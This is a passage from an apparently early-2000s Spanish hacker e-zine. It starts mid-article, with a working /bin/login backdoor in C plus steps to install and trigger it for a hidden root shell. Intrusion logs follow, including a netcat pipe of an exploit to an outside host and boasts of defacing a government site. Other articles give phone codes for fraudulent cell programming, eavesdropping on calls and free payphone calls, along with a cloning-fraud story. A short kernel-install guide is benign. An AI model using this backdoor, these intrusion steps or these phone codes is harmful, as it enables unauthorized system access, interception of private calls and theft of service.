  Pudiendo  logearse al  sistema y  si uno quiere poner una clave para que
  solo  uno  pueda entrar y que nos de una shell de root cada vez  que  se
  lo pedimos.

  Bueno  entonces  a  poner un troyano!!! , para poner un troyano hay  que
  tener root. Asi que vamos a usar este troyano:

[++] xploit/login.c
  /*
   * Localcore (http://www.localcore.org) login backdoor.
   * To trigger, you can either do:
   * DISPLAY=MAGIC_WORD; export DISPLAY; telnet target-host
   * or
   * telnet
   * env def DISPLAY MAGIC_WORD
   * o target-host
   *
   * Installation: copy /bin/login to /usr/lib/login , chmod 755 it,
   * copy this to /bin/login, chmod 4755 it and touch all timestamps.
   *
   * Change the MAGIC_WORD and such to taste your fit.
   */

  #include <stdio.h>

  /* start of user def stuff */
  #define OLDLOGIN "/usr/lib/login"
  #define LOGINNAME "login"
  #define MAGIC_WORD "localhost"

  /* end of user def stuff */

  /* To make it a bit better looking in strings */

  #define REVISION "$Id: Localcore 2000/08/14 21:31:00 marekm Exp $"

  char **exe;

  do_back() {
	puts(REVISION);
	putenv("TERM=vt100");
	putenv("HISTFILE=/dev/null");
	execl("/bin/sh","sh","-i",0);
  }

  main(argc, argv)
	int argc;
	char *argv[];
  {
	exe = argv;
	exe[0] = LOGINNAME;
	if ((char *)getenv("DISPLAY") != (char *)NULL)  
         if (strncmp(getenv("DISPLAY"),MAGIC_WORD,strlen(MAGIC_WORD)) == 0) 
           do_back();
	execv(OLDLOGIN,exe);
  }
[--]


  Este troyano es el que mas me gusta ;-) gracias localcore ;-)
  Bueno para poner este exploit tenemos que hacer lo siguiente:

  #cp /bin/login /usr/lib/login
  #chmod 755 /usr/lib/login
  #tee login.c
  #gcc -O2 login.c -o login

  el exploit lo ponemos en /bin/login

  #chmod 4755 /bin/login

  y luego hay que hacer un touch

  Bueno  lo que hicimos aca fue reemplazar el /bin/login por este troyano.
  Si le queremos poner clave tenemos que modificar el codigo  del  troyano
  antes de compilarlo, lo que tenemos que modificar es:

  #define MAGIC_WORD "localhost"

  en vez de localhost podemos la clave que querramos por ejemplo: Rd2MZ*a2d
  linda clave no?? jejeje.

  Entonces luego de haber puesto el troyano nos salimos  del host, habiendo
  borrado  todas  las  huellas  y  habiendo dejado el  sistema como estaba.
  Y desde cualquier terminal ponemos la siguiente sintaxis:

  export DISPLAY="localhost"; telnet victima.com

  Trying 200.00.00.00...
  Connected to victima.com
  Escape character is '^]'.

  SCO OpenServer(TM) Release 5 (host) (ttyp0)

  $Id: Localcore 2000/08/14 21:31:00 marekm Exp $
  #
   id uid=0(root) gid=3(sys) groups=3(sys),0(root),1(other)
  #

  aclaracion: "localhost" es la clave que no definimos, la que viene  por
  default.

  Entonces bueno ya ta tenemos root y nadie nos ve ;-) jejejeje


  10- Ataques del tipo D.o.S
      ----------------------

  Bueno el D.o.S son ataques de negacion de servicio, yo  solo los practico
  contra paginas pornograficas, estos son programas como  los que se usaron
  contra yahoo y amazon lo que se hizo en esa ocacion fue desde varios host
  poner programas, programados para atacar a una determinada hora en un dia
  determinado. Para conseguir programas dos http://www.hack.co.za/dos/ddos/
  y luego para cada sistema operativo hay un atake distinto.

  Bueno no hay mucho que decir en este punto.



  11.- Descubriendo exploits locales en nuestro sistema
       ------------------------------------------------

  Bueno esto es un tema apasionante , lo voy a tratar muy  por  arriba  por
  que hay muchos textos que dicen como ;-)

  http://www.hack.co.za/papers/exploithowto/index.html
  http://www.hack.co.za/papers/basicoverflows/index.html
  http://www.hack.co.za/papers/advancedoverflows/index.html

  Hay  que  aclarar  que para conseguir una shell root el programa tiene que
  tener SUID, para saber que programa tiene suid se pueden bajar el programa
  check.pl de http://freshmeat.net

  Ese programa es muy bueno ;-)

  Bueno luego  de  saber que programas tienen SUID, hay que  empezar a jugar
  con cada uno hasta que alguno cree un core.

  Como hacemos esto? con la siguiente sintaxis:

  programa -language `perl -e 'print "A"x1200'`

  si esto sirve nos va a tirar un core

  entonces ponemos  gdb  programa  core, luego ponemos info registers  y nos
  tiene  que  aparecer  ip  4141414141 si nos aparece esto quiere  decir que
  sobreescribe la pila ahora lo que hay que hacer es hacer el exploit.

  Si  no saben programar  o  estan  aprendiendo  pueden hacer  lo  siguiente
  bajarse exploit de http://www.hack.co.za y mirarlos y poner el programa de
  ustedes y empezar a jugar, antes hay que leer ;-)


  12.- Anexos:

   A.- Mis Log's de como entre a varios lugares.
       -----------------------------------------

  Por ejemplo un ejemplo del finger:

  sonyy:~ #  telnet victima.com 79
  Trying 200.0.0.0
  Connected to host.
  Escape character is '^]'.
  ventas

  Welcome to Linux version 2.2.7 at host !

  9:10am  up 1 day, 23:56,  2 users,  load average: 0.03, 0.02, 0.00

  Login: ventas                           Name: ventas
  Directory: /home/ventas                 Shell: /bin/bash
  On since Sat Mar  3 09:00 (VET) on ttyp1 from nasa.gov. (Jejejeje)
  New mail received Fri Mar  2 06:58 2001 (VET)
  Unread since Wed Nov 22 13:16 2000 (VET)
  No Plan.
  Connection closed by foreign host.

  sonyy:~ #
  sonyy:~ # telnet victima2.com
  Trying 200.00.00.0.
  Connected to host
  Escape character is '^]'.

  Welcome to SuSE Linux 6.1 (i386) - Kernel 2.2.7 (ttyp2).
  host login: ventas
  Password:
  Have a lot of fun...
  You have new mail.

  ventas@host:~ > cd /
  ventas@host:/ > cd tmp
  ventas@host:/tmp > tee cronexpl.c
  ventas@host:/tmp > gcc -O2 cronexpl.c -o cronexpl
  ventas@host:/tmp > ./cronexpl
  ventas@host:/tmp > crontab ./CrOn
  ventas@host:/tmp > crontab -r
  ventas@host:/tmp > su -l cronexpl

  Password:
  victima2: #

  listo root!!!

  ven que facil!!!

  vamos con otro ejemplo:

  victima: # (./s 0;cat) | netcat www.fuac.edu.co 457  
  id
  uid=28(nouser) gid=28(nogroup) groups=28(nogroup)    

  bueno listo
  ahora ya saben como funciona la cosa.

   B.- Como entre a www.venezuela.gov.ve
       ---------------------------------

  Bueno aunque  no lo crean fue muy facil, escanee los puertos, y  encontre
  un bug en el rpc, esto no se lo dije a nadie hasta que lo parchee , ahora
  ya no funciona ;-) por lo menos el que yo use.

  luego  cambie  la  web, borre las huellas y crackee todos  los pass: root
  etc... muy faciles y luego me sali, no puse troyano ni nada, y la segunda
  vez que lo crackee use un exploit remoto que me dio una  nobody y despues
  use un exploit local obtuve el root y luego sigue el mismo procedimiento.

  La verdad ese admin no tiene ni puta idea de nada.


  13.- Despedida
       ---------

  Bueno  me  parece que  es  bastante  o  no? si en algo me equivoque, o me
  quieren decir cualquier cosa, mi correo es Sonico60@hotmail.com

  Espero que les haya servido para algo este texto.

  byes!!!
  
  --Sonyy

  Saludos a : MerPHe , Sicario, Capone , y para todos byes!!!




-[ 2x10 ]--------------------------------------------------------------------
-[ Articulos Varios sobre Telefonia ]-----------------------------[ Varios ]-
-----------------------------------------------------------------------------


                                      ------------------------------[ 2x0a ]
                                      ---------[ Programacion de Celulares ]
                                      ---------[ Pesado - pesado@cantv.net ]
					
  Indice General

  * Introduccion
  * Programacion:
    - Nokia 2160/2110
    - Nokia 5120/5125/6120/8260/8860
    - Ericsson 388/368/318/338/738
    - Hyunday HGC110
    - Samsung SC#620/4110/811
    - Motorola Analogico
    - Mercury
  * Tips


  Introduccion
  ------------

  Hola Amigos, este texto tiene como finalidad ense~arles a ustedes como
  programar  un  celular y NO ME HAGO RESPONSABLE POR EL MAL USO DE ESTE
  PAPER, ya que puedes JODER  tu  telefono (como quien  dice, en  guerra
  avisada no muere soldado), Ok.


  NOKIA 2160/2110
  ---------------

  * Presionamos *3001#12345 y la tecla Menu (o Select)
  * Nos  vamos  hacia  el NAM  2 y metemos 31488  donde  dice HOME SYSTEM ID,
    donde dice HOME SOC  colocamos  0  y donde dice Own Number ponemos 158+El
    numero de telefono asignado.
  * Luego donde dice "Default Settings", presionamos la tecla Menu (o Select)
    y aparecera un menu, luego nos vamos  hasta  donde  dice OVERRLOAD CLASS,
    alli colocamos el ultimo digito  del  numero  de  telefono  y para grabar
    presionamos la Tecla Menu, luego nos corremops donde  dice  GROUP ID 02 y
    presionamos la tecla Menu y para  terminar  la  programacion  simplemente
    apagamos  y  prendemos  el  telefono  (es  algo  asi  como  para  iniciar
    configuracion, solo reiniciamos y ya!).


  Nokia 5120/5125/6120/8260/8860
  ------------------------------

  - Presiona:

  * Presionamos *3001#12345# (Entras a la Configuracion Interna)
  * Nos  vamos  hacia  el  NAM 2  y  metemos 31488 donde dice HOME SYSTEM ID,
    donde  dice  HOME SOC colocamos 1 y donde  dice Own Number ponemos 158+El
    numero de telefono asignado.
  * Luego donde dice "Default Settings", presionamos la tecla ENTAR.
  * En  la opcion 9 colocamos el ultimo digito del numero de letefono y el la
    opcion 10 aparecera la Opcion GROUP ID (02).
  * Solo nos queda apagar y vulver a encender el telefono.

  <<  TIP'S de Pestilencia : Con los diferentes Nokia's pueden probas estos
    codigos:

    *#92772689#  (Chequea el Numero de ISDN 
    *#9999#      (Muestra la version del SW)
    *#639#       (Reconfigura los NAM's)

  >>>



  ERICSSON 388/368/318/338/738
  ----------------------------
  * Presionamos 923885 (Menu) 1
  * Buscamos con RCL hasta que aparezca MOVILE ID, 158 +  Numero  asignado y
    nos vamos a donde aparezca 31488, luego nos vamos donde dice ALPHA TAG y
    alli metemos el Nombre del Usuario del Celular, luego  nos vamos a EXIT.


  SAVE: YES
  CANCEL: NO

  Presionamos (Yes) para grabar la programacion ... Uy que Elite ;)



  HYUNDAY HGC110
  --------------

  * Presionar #86904**89397#
  * Luego Seleccionamos NAM1 y presinamos (MEM)(MEM)
  * Nos movemos con la Tecla # hasta la opcion PHONE 014 (en el caso de ser
    Telcel) y luego (MEM).
  * Despues nos vamos hasta la Opcion SID-NID y presionamos (MEM)
  * Incluimos 31495 y presionamos la tecla (MEM) ocho veces.
  * Ahora  presionamos la tecla (END P) tres veces y listo.


  Y para el Mundo Analogico:

  * Presionar #86904**89397#
  * Selecionamos NAM1 presionando (MEM)
  * Nos movemos con la tecla # hasta la opcion FM SETUP y presionamos (MEM)
  * Ahora vamos hacia la opcion HOMESYS ID y presionamos (MEM)
  * Incluimos el 31495 y presionamos la tecla (MEM) y despues presionamos END
    tres veces.



  SAMSUNG SC#620 / 4110 / 811
  ---------------------------

  * Presionamos 47*869#08#9
  * Nos  metemos  en Setup NAM1 presionando la tecla 2 y seleccionamos PHONE#
    presionando  1 a continuacion  metemos el 014 (en el caso de Telcel) y el
    Numero  Telefonico  y  presionamos dos veces OK y asi regresamos  al Menu
    Principal de SETUP NAM 1.
  * Ahora   entramos   en  la  opcion  CDMA  presionando  la  tecla  3, luego
    presionamos  OK  y  vemos  el  parametro  IMSI  -  MNC; incluimos  0+0  y
    presionamos  cinco veces OK hasta llegar a SCHNSYSA, alli colocamos 2+4+2
    y presionamos ocho veces OK.
  * En SID#1 escribimos 31495 y presionamos ocho veces OK.
  * Ahora presionamos la tecla END y aparecera un mensaje.



  MOTOROLA ANALOGICO
  ------------------

  * Tecla (FNC) 00**83786633 Tecla (STO) #55#

  1. Codigo (en el caso de Telcel es 31495)
  2. 10101101
  3. Codigo (en el caso de Telcel es 014) + Numero de Telefono del Celular
  4. 10
  5. Ultimo Numero del Celular.
  6. 12
  7. 000000
  8. 03333
  9. 004
  10. 11000100
  11. 00000000
  12. 0333
  13. 0333
  14. 0334
  12. 021
  16. 10100011
 

  Y para Salir presionamos *01#



  MERCURY
  --------

  * Tecla (FNC) 00**83786633 Tecla (STO) #55#

  1. Codigo (en el caso de Telcel es 31495)
  2. 10000000
  3. Numero de Telefono del Celular
  4. 106
  5. Ultimo Numero del Celular.
  6. 000000
  7. 123
  8. 4
  9. 01000000
  10. 00000000
  11. 0333
  12. 0333
  13. 0334
  14. 0021
  15. 00100000
  16. 10100111
  17. 2
  18. 31495
  19 . 65535
  20. 05800
  21. 0283
  22. 0384
  23. 0242
  24. 0777
  25. 00000
  26. 65535


  <<< TIP'S de  Pestilencia: Los motorolas y los Ericsson, podemos ponerlos
      en modo Sniffer (Modo Promiscuo), es decir, captar las conversaciones
      de las  demas personas, solo con solo una programacion sencilla. Aqui
      estan los modos de programacion para los tlf's:

      Motorola (Todo tipo)
      --------------------

      * Presionar Tecla (FNC) 00**83786633 (STO) #11xxx#08# , donde xxx es
        el canal.

      Canales Recomendados: 991, 799, 623 y 333 

 
      Para salir de esto, simplemente introducimos 01#


      Ericsson modelo DH
      ------------------

       * Presiona 9 0 4 0 5 9 y [Menu], Aparecera en pantalla TEST SET Yes
         1 y Rcl Aparecera en pantalla DONE
       * Presiona Yes 8 6  Aparecera DONE y comenzaras a escuchar una lluvia
         de ruido, luego presiona Yes 3 CLR 0 xxx (donde xxx es el numero de
         canal).
       * Aparecera DONE y comenzaras a escuchar conversaciones =)


       Canales Recomendados: 500, 788, 789, 300 y 799


      Ericsson modelo KF o POCKET
      ---------------------------

      * Presiona 9 0 4 0 5 9 y [Menu]  y  aparecera en pantalla TEST SET Yes
        1 y luego Rcl aparecera en pantalla DONE
      * Presiona  Yes 8 6  y  aparecera DONE y comenzaras a escuchar lluvia
        de ruido.
      * Presiona Yes 3 CLR 000 xxx (Donde xxx es el canal).

      Canales Recomendados: 500, 788, 789, 300 y 799


  Para que tu Telefono vuelva a la normalidad tienes que presionar Yes 3 Rcl 

  >>>

  Bueno, espero que les sirva de algo y cualquier cosa me escriben a 
  pesado@cantv.net


  --EOF--

                            ----------------------------------------[ 2x0b ]
                            ----------------------------[ Phreak Inofencivo]
                            ---------[ aCiD_BuRN_dX - acid_hack@uol.com.ar ]


  Hola  a  todos, antes que nada  les  queria decir que  si  no les interesa 
  el  phreak  igual  lean  este articulo, uno nunca  sabe  cuando  le  puede 
  servir. espero disfruten de este articulo  como yo lo disfrute al hacerlo.
 

  1.- Que lo page telefonica!!!
  
  Este  truquito  es  bien  facil  y boludo, pero los puede sacar de apuros 
  en varias ocaciones, se los voy a contar en forma de cuento.
   

     acid     }=------------ pelo tudi to ------------={     acid


  "habia una vez un pibe que se habia perdido  en buenos  aires, que  como
  sabran  no es dificil perderse ahi, entonces  quizo  llamar  a  la  casa 
  para  habisarles  en  que calle estaba  y que lo vinieran a buscar, pero
  el pibe que  se  llamaba "pelo tudi to" no  tenia  ni un mango, entonces 
  se  le  ocurrio una forma  de  llamar a la casa  y  que  la  llamada  la 
  pague  telefonica, marco  el  19  que  como  todos saben  es la linea  a 
  cobrar, vos llamas  y  lo  paga  el  otro, pero "pelo" no queria que sus
  padres  pagaran  la  llamada, entonces  se  le  ocurrio otra idea, marco
  el 19, lo  atendio  telefonica, le  dijo  que  si  queria llamar alguien 
  presione  el 3, "pelo" apreto el boton 3 y le pidio que marque el numero
  pelo  lo  hizo, y  despues le  pidio que diga su  nombre, en ese momento
  lo  que  telefonica  hace  es  grabar lo que dices, entonces, en  vez de 
  decir  su  nombre dijo "estoy  en  la calle  de  los  pelotudos", espero 
  cuando  sus  padres  atendieron, telefonica  les dijo, tienen un mensaje
  de ... "estoy  en  la  calle  de  los  pelotudos" si  quiere  aceptar la 
  llamada  apriete  el  3, (lo que telefonica hizo  fue reproducir  lo que 
  habia dicho "pelo")  los  papas al reconocer la voz de pelo no aceptaron
  la  llamada  y  fueron a buscarlo, asi felices  y  contentos  cagaron  a 
  telefonica"

  """"""" Cualquier semejanza con la realidad es pura coinsidencia """""""
 
  2.- A llamar gratis!!!!
  
  Este truco funciona solo con los telefonos semipublicos, los que encontras
  adentro de los kioscos, lo que hay que hacer es muy sencillo: 

  El telefono tiene un tablero con los numeros:


                                  1 2 3
                                  4 5 6
                                  7 8 9
                                  * 0 #  (boton verde o
                                          de otro color)


  El  truco  conciste  en apretar al mismo tiempo los botones * + # +  boton
  verde o de otro color.

  Si lo hicimos bien en la pantalla nos dira que ingresemos una clave que por
  lo general es:
 
                                123456
                                666666
                                555555       
                                444444         ( si no es ninguna 
                                333333           de esas prueben
                                222222           otras )
                                111111


 Y  luego  de haber puesto la clave podran hacer llamadas  a  donde  quieran
 pero  hay  que  tener  cuidado, en la pantalla se va a ver "llamada gratis"
 y si el kioskero la ve no creo que le guste.

 Lo  que  hicimos  fue  entrar  en  el  modo de llamadas gratuitas, que solo 
 lo puede hacer los de telefonica ( y ahora ustedes ).

 Porque tenemos que pagar por un servicio que deberia ser gratuito???

 Bueno, me   despido, estos  trucos  son  inofencivos, en  la  proxima  les 
 voy  a  contar como  hacer "boxes"  y como usarlas, si tienen alguna duda,
 reclamo o quieren intercambiar info, pueden hacerlo a
 
 acid_hack@uol.com.ar

 no soy un experto del phreak, de hecho se muy poco, tambien se del hack en
 general.




                                 -------------------------------------[ 2x0c]
                                 ----------------------------[ Kernel 2.4.x ]
                                 ------[ Mr. kl0nk Manson - kl0nk@0ri0n.org ]


  Introduccion:
  =============

  Este texto tiene  como  finalidad  facilitar la rapida configuracion e
  instalacion  de  el  Kernel  2.4.x desde  una  distribucion  de  linux
  compilada para un kernel del tipo 2.2.x .


  Requisitos Minimos para la Instalacion:
  =======================================

  Antes de instalarlo debes revisar si tu software es compatible con esta
  nueva version del nucleo de Linux, y para ello debemos  actualizar  los
  siguiente paquetes:

   ----------------------------------------------
   |         Paquete         |  Version Minima  |
   ----------------------------------------------
   | Gnu C (gcc)             |    2.91.66       |
   | Gnu make (make)         |    3.77          |
   | binutils  (ld)          |    2.9.1.0.25    |
   | util-linux (fdformat)   |    2.10          |
   | modutils (insmod)       |    2.4.0         |
   | e2fsprogs (tune2fs)     |    1.19          |
   | pcmcia-cs  (cardmgr)    |    3.1.21        |
   | PPP (pppd)              |    2.4.0         |
   | isdn4k-utils (isdnctlr) |    3.1pre1       |
   ----------------------------------------------

   Nota: Para ver la version de cada paquete simplemente hacemos
         #comando --version 


  Instalacion
  ===========

  Despues de bajarnos el Kernel 2.4.x de kernel.org y de haber actualizado
  es la lista de paquetes antes descritas, simplemente  descomprimimos  el
  kernel con:

  #tar xvfz linux-2.4.x.tar.gz

  o si nuestro kernel esta en formato .tar.bz2

  #bzip2 -d linux-2.4.x.tar.bz2
  #tar xvf linux-2.4.x.tar

  Ahora lo renombramos:

  #mv linux/ linux-2.4.x

  Creamos un directorio dentro de /usr llamado kernel/ y movemos nuestro
  kernel alli con:

  #mkdir /usr/kernel
  #mv linux-2.4.x/ /usr/kernel/
                    
  NOTA: Por razones  mayores   no  podemos instalar  este  nuevo Kernel en
  /usr/src , ya que  nuestro  sistema   esta compilado para un 2.2.x; esto
  sucede porque los encabezados del 2.2.X son Diferentes a los de el 2.4.x
  y esto podria interferir cuando vallamos a instalar un nuevo paquete.

  Ahora  simplemente  nos  vamos  a  /usr/kernel/linux-2.4.x  y  iniciamos
  nuestra compilacion con las siguientes opciones:

  #make oldconfig  => Solo para Guru's
  #make menuconfig => Obtienes una interfax amigable (consola)
  #make xconfig    => Solo para las X's

  Ahora  simplemente  nos  queda  activar/desactivar  las  opciones  que
  necesitemos.

  Luego nos queda compilarlo con:

  #make dep             (compilamos las dependencias)
  #make clean           (limpiamos archivos temporales)
  #make modules         (compilamos los modulos)
  #make modules_install (instalamos los modulos)
  #make bzImage         (creamos la imagen)
  #make install         (instalamos la imagen)

  Simplemente nos queda ejecutar /sbin/lilo y listo, solo nos queda
  reiniciar nuestra computer y probar nuestro nuevo kernel.

  NOTA: make modules y make modules_install lo utilizamos siempre y cuando
        hallamos elegido en nuestro kernel la opcion <M>.


  Conclusion
  ==========

  Este  es  un  peque~o  texto para instalar el nuevo kernel 2.4.x  en  una
  distribucion  que  este regida por  un  2.2.x; para  la  proxima  entrega
  hablaremos mas sobre el mismo y las nuevas utilidades que trae esta nueva
  version.

  

  --EOF--



-[ 2x11 ]--------------------------------------------------------------------
-[ Casos de la Vida Real ]-----------------------------------[ 0ri0n Staff ]-
---------------------------------------------------------[ staff@0ri0n.org ]-

 Introduccion
 ------------
 
 Este  paper tiene  como la finalidad de que ustedes  lectores reflexionen y 
 sepan hacer las cosas; son ejemplos de la vida real  que  nos han  sucedido 
 a todo el staff de 0ri0n. 
 
 Este primer caso es sobre la Adiccion a los telefonos Celulares y mas si tu
 lo estas clonando ... pero puede traer consecuencias Fatales ... 
 
 
 ----------------------------------------------------------------------------

 Nos encontrabamos en la LAN de 0ri0n sin hacer nada, entonces vemos a nuestro 
 amigo  "Miguelito"[1]  muy  emocionado  con  su  Celular, y  Zeus pregunta le 
 pregunta:
 

 Zeus      : Que haces, Miguelito?. 
 Miguelito : Estoy Clonando Celulares.
 Zeus      : Y como se hace eso?.
 Miguelito : Ven para explicarte ... 
 
 y alli entra Kiwwi y pilla la nueva forma de clonacion y entonces llega y
 nos dice:
 
 Kiwwi     : Hey Muchachos [2], pille como Miguelito clona los celulares...
 kl0nk     : Como como es esa verga?????
 vbxsys    : Kiwwi si no me dices te ....
 Kiwwi     : Es asi...

 y Kiwwi le explica a kl0nk y vbxsys...
 
 4 Horas despues...
 
 ShAd0w5 se da cuenta de algo raro entre Kiwwi y vbxsys con sus celulares y
 ve a Kiwwi que asi de facil le presta su celular a una Xchica desconocida
 por el grupo para que haga llamadas internacionales...
 
 ShAd0w5   : Hmmm, verga Kiwwi prestamelo a mi...
 
 Claro ShAd0w5 lo dice por joder...
 
 Kiwwi     : Para donde necesitas llamar?
 ShAd0w5   : Para la casa de mi Novia.
 Kiwwi     : Hmmm te tienen sometido.... jejejejejejeje.
 ShAd0w5   : Es en serio.
 Kiwwi     : Ok toma pues.
 
 Claro media hora despues... ...ShAd0w5 hablando por cuernofono celular
 digital:
 
 ShAd0w5   	  : Hola mi Amor, nos vemos a las ..., en mi apartamento.... 
                    para Qliemos[3]...
		    
 Novia de ShAd0w5 : Claro mi negro, alli estare.

 ShAd0w5          : Entonces, voy a la farmacia a comprar con..
 
 
          [ Esa conversacion ha sido C.E.N.S.U.R.A.D.A por  ]
	  [        La Sociedad Lactea de Nueva Zelanda      ]
 

 ShAd0w5          :  Ok mi cielo, Te espero, chao.
 	    

 Luego, despues que pasaron dos dias nos reunimos y empezamos a contar 
 nuestras Experiencias:
 
 kl0nk  : Yo llame a Capone y estube hablando con el por casi una Hora ....
 Kiwwi  : Jejeje, yo llame a mi tia en USA y le dije que le iba a depositar
          para que me comprara una Portatil, que alla estan muy baratas ....
 VbxSys : Jajaja, pobrecito el pendejo que cayo, Llame a mi mama en Holanda[4],
          hable con ella por mas de dos horas, jeje corte con ella porque el 
	  telefono me decia "Bateria Baja", jejeje ...
 Jess   : Mierda, porque no me avisaron, yo tambien queria llamar =(
 kl0nk  : Uuuuuu, Jess tu necesitas un compilador para tu phone[4]
 		    
 
 Luego, 20 Minutos despues ...
 
 Pestilencia : Voy a llamar a kl0nk a ver cuando co~o va a salir la revista..
 Pestilencia : 0XX-XXXXXXX Send 
 kl0nk       : Mmm, es la Peste [Boton] [5]
 kl0nk       : Que paso compadre, como te fue con la clonacion....
 Pestilencia : Venite para la licoreria "La Lexxxx" y hablamos mejor..
 kl0nk       : Verga, ya estas Borracho
 Pestilencia : No Loco, Venite [6].
 

 Luego kl0nk va a esa licoreria y se encuentra que ...

 kl0nk       : Que paso Peste.
 Pestilencia : Pues aqui loco, mira encontre una lista de numeros a clonar
               que estan por Tarjeta de Credito....
 kl0nk       : Uy, pasalos pa'aca para probar
 Pestilencia : Agarra pues ....


 Al mismo tiempo que esta kl0nk con Pestilencia en la Licoreria, estan
 VbxSys, Jess, Kiwwi y ShAd0w5 reunidos y ...
 

 Jess : Digamen cuerda de co~o e'madres, yo tambien quiero aprender ...
 Kiwwi: Dame 1500$ y te explico =)
 Vbxsys: Jess, es asi, agarra y entra a la conf.....
 
 Cuatro Horas mas tarde llega kl0nk a su casa y se encuentra a "Marco Guns" y
 el le dice:
 
 Marco Guns : Mira, ense~ame pues, ya tengo varias victimas.
 kl0nk      : Ok, es asi .....
 
 Al otro dia se reunen todos y empiezan a contar de nuevo sus experiencia..
 
 ShAd0w5: Mierda, agarre dos numeros y les volvi mierda la tarjeta prepagada..
 kl0nk  : Si Supieran, esta madrugada estaba ladillao y me puse a revisar el
          periodico y adivinen, ya me daba un infarto con todas esas victimas 
	  que es estaban alli, ya tengo alrededor de 350 Victimas para probar
 Kiwwi  : No joda, yo me quede dormido.
 VbxSys : Jejeje, kl0nk, pasame la lista de Victimas..
 kl0nk  : Ya la envie a la lista privada para que empiecen a probar..
 
 Ese mismo dia "Marco Guns" empieza el abuso de la clonacion y....
 
 
 Marco Guns: Voy a llamar a mi Tia Morela que esta en Alemania
 
 45 Minutos despues ...

 Marco Guns: Voy a llamar a mi primo "Serje" a Valencia, pero primero ...
 
 Marco Guns         : Mama, por favor, prestame tu celular.
 Mama de Marco Guns : Agarralo, esta alli encima de la mesa.
 Marco Guns         : Gracias Mom.
 
 Luego de casi Hora y Media de Hablar con Serje, agarra de nuevo su Celular[7]
 y pone a cargar el de la Mama y asi esta por varias horas, Luego el fin de 
 semana Marco Guns se encuentra a kl0nk y...
 
 kl0nk : Que paso Marco, como te fue con la clonacion?.
 Marco Guns : Mierda, llame a ..........
 kl0nk : Tas Loco, verga, el telefono que tu clonastes estaba por tarjeta 
         de credito?
 Marco Guns: Si.
 kl0nk : Y cuantas llamadas hicistes desde ese numero?.
 Marco Guns: Alrededor de 50 Llamadas.
 kl0nk: Que?????, estas loco, mierda,  cuando al  tipo ese le llegue el recibo
        del telefono se va a dar cuenta y va a  poner la denuncia en la XXX[8]
 Marco Guns: Ah, a mi que me importa, total que me pueden comprobar.
 
 Bueno, rapdamente, kl0nk contacta a sus amigos y le cuenta lo que hizo 
 "Marco Guns" entonces:
 
 kl0nk : Mierda, dejemos esa vaina muchachos por un tiempo.
 Kiwwi : De verdad que si.
 Vbxsys: Pero cuanto va a ser el lapso?
 Kiwwi : Propongo tres meses.
 kl0nk : Ok.
 Vbxsys: Echo.
 
 Luego regamos la voz a todo el staff y los a llegados, luego de dos meses 
 sucede lo siguiente:
 
 Miguelito         : Mama, tocan la puerta.
 Mama de Miguelito : No Joda, abre tu.
 Miguelito         : Verga, mi mama si jode...
 
 Y el abre la puerta y se consigue a tres tipos "De Negro" y ellos le dicen:

 Agente 1          : Buenas, se encuentra el Sr. "Miguelito XXXXXX"
 Miguelito         : Si se~or, soy yo, que desean?.
 Agente 2          : Queda arrestado por Estafar al "Sr. Rajuela Rodriguez"
 Miguelito         : Mama, Mama, MAMA, MAMAAAAAA, Me quieren meter Preso.
 Agente 1          : Por Favor, extienda sus Manos para Colocarle las Esposas.
 Agente 3          : Dejame, yo pongo las esposas.
 Mama de Miguelito : LLevese a ese Desgraciado, el me malogro a mi Perro [9]
 Miguelito         : (Llorando), Mama ayudame, llama a papa para que me saque 
                     de la carcel.
 Mama de Miguelito : No, no lo voy a llamar y ojala te pudras en la carcel por 
                     mal Hijo.
 Miguelito         : (Llorando), Mama, Te Amo.

 
 Y se llevaron a Miguelito, a la 1/2 horas nos enteramos que habian metipo 
 preso a miguelito y cada quien tomo la precaucion de esconder su telefono 
 (Jess  lo  por  un  barranco), mientras  Marco Guns  se cago todo y fue a 
 Valencia para la casa de su primo pero Sucede lo siguiente:
 
 Agente 1      : Buenas Tardes Sra.
 Mama de Marco : Buenas, que desea.
 Agente 1      : Se encuentra el Sr. Marco Guns?
 Mama de Marco : No, el esta de viaje para Barcelona[10]
 Agente 2      : Por Favor Sra. No lo incubra, dejeme pasar [11].
 Mama de Marco : Pase y si quiere los busca pero el no esta aqui.
 Agente 3      : Lo que sucede es que su Hijo es un Estafador, es un clonador
                 de celulares.
 Mama de Marco : Queeeee??, mi hijo no es ningun clonador.
 Agente 3      : Sra. Lo lamento mucho, me va a tener que acompa~ar la a 
                 jefatura.....
		 

 Y  bueno  aqui termina todo, todavia estan buscando a Marco Guns y  no  nos
 han reportado todavia, Jess se quedo sin celular y nosostros  no  lo podemos
 utilizar por un largo tiempo, pero ustedes se preguntaran lo siguiente:
 
 F.A.Q's
 -------
 
 1. Que paso con Miguelito?
 R: Esta en la Carcel del Dorado y le dieron una Pena de 10 a~os por estafa.
 
 2. Que paso con Marco Guns?
 R: Esta en Valencia con su primo Serje (Bueno, eso fue lo ultimo que nos 
    enteramos).
 
 3. Que paso con el Perro de la Mama de Miguelito?.
 R: Hace unos dias que se murio, ah, el perro se llamaba Negro.
 
 4. Mmm, para mi que todo esto son inventos de la imaginacion sucia de alguno 
    de ustedes, y si no es asi, que paso con ustedes?, porque a ustedes no lo 
    meterion preso?
 R: Porque nosotros fuimos precabidos, por decirte, Se clonaba un celular una 
    vez, la cual haciamos dos llamabas y se clonaba uno nuevo.
    
 
 
 Bueno, esto es todo por hoy, para la proxima entrega tendremos otro 
 "Caso de la Vida Real" (con Dora Da Gostino ... jejeje).
 
 Byezz.
 

 ---------------------------------------------------------------------------

  [1]: Notese que NO ES el de Mafalda. 
  [2]: Se refiere a los del Staff de 0ri0n
  [3]: En traduccion es "Forniquear"
  [4]: Notese que Vbxsys no es nacido en Venezuela.
  [5]: kl0nk presiona el boton de "Contestar Llamada"
  [6]: Pestilencia SI estaba Borracho  
  [7]: Anteriormente el puso a cargar Otra Pila.
  [8]: Notese que es la Policia que esta en la Elite.
  [9]: Miguelito violo al Perro que tenia en su casa con un palo de Escoba, y 
       por eso la Mama lo Odia Tanto.
 [10]: Notese que la Sra. Sabia lo que habia hecho su Hijo y lo estaba 
       Incubriendo.
 [11]: Los Agente estaban violando la Constitucion Venezolana porque ellos
       irrumpieron a la Casa de Marco Guns sin una Orden de Cateo.


--EOF--



-[ 2x12 ]--------------------------------------------------------------------
-[ Glosario de Terminos de Computacion ]---------------------[ 0ri0n Staff ]-
---------------------------------------------------------[ staff@0ri0n.org ]-


   Esta seccion tiene un peque~o glosario  de terminos  informaticos  usados
   habitualmente por usuarios de Linux. (extraido con previa autorizacion de
   linux-es.com). Se ha incluido este glosario, ya que mucha gente que llega
